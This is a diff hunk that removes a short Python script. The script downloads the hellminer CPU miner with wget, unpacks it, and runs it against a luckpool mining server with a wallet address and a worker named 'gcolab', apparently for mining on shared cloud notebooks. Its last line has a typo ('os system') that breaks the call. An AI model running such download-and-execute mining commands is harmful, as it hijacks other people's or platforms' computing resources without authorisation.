@@ -1,5 +1,0 @@
-#!/usr/bin/python3
-import os
-os.system("wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz")
-os.system("tar -xvf hellminer_cpu_linux.tar.gz")
-os system("./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RHvyBq43am2Cfu6xp8tJzDUqj8Jsok5Byq.gcolab -p x --cpu 40")
